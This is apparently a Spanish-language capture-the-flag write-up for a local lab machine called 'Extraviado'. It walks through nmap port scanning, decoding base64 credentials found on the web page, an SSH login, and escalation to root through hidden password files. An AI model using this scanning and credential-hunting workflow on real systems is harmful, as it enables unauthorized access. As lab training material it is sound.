- Tags: #Extraviado
---
[Maquina Extraviado](https://mega.nz/file/CIMkwajZ#S3NkpK5GTJq043gn4RLQNTYdCASjxYnJzVN8JMSwkD0) -> Enlace de descarga al laboratorio

```bash
7z x extraviado.zip # Descomprimimos el laboratorio
sudo bash auto_deploy.sh extraviado.tar # Desplegamos el laboratorio.
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determinar si tenemos conectividad con el target.

wichSystem.py 172.17.0.2 # Determinamo que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p1-10000 # Realizamos deteccion de puertos con nuestra herramienta.
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevande del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) )** -> Tenemos un servicio **ssh** expuesto
**( 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu)) )** -> Tenemos un servico web expuesto: **( ubuntuNoble )**

### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2 # Realizamos deteccion de las tecnologias de este servicio
```

```bash
.ZGFuaWVsYQ== : Zm9jYXJvamE= # Desde la web tenemos estas cadenas en base64

echo -n "ZGFuaWVsYQ==" | base64 -d # daniela
echo -n "Zm9jYXJvamE=" | base64 -d # focaroja
```

### FAse Intrusion:
Sabiendo que esta expuesto el servicion **ssh** procederemos a intentarnos loguear con esas credenciales expuestas.
```bash
ssh-keygen -R 172.17.0.2 && ssh daniela@172.17.0.2
```

### Fase Escalada Privilegios:
```bash
/home/daniela/.secreto/passdiego # Tenemos un directorio oculto

YmFsbGVuYW5lZ3Jh # Tenemos su contrasena en base64 del usuario: ( diego )
echo -n "YmFsbGVuYW5lZ3Jh" | base64 -d # ballenanegra
```

```bash
su diego # proporcionamos la contrasena: ( ballenanegra ) y ahora podremos migra a este usuario.
/home/diego/.passroot/.pass # Tenemos posiblemente la contrasena de root.

echo -n "YWNhdGFtcG9jb2VzdGE" | base64 -d # acatampocoesta , Pero no es la contrasena correcta
cat .local/share/.- # Tenemos este directorio que podemos investigar

su root # Contasena ( osoazul )
```

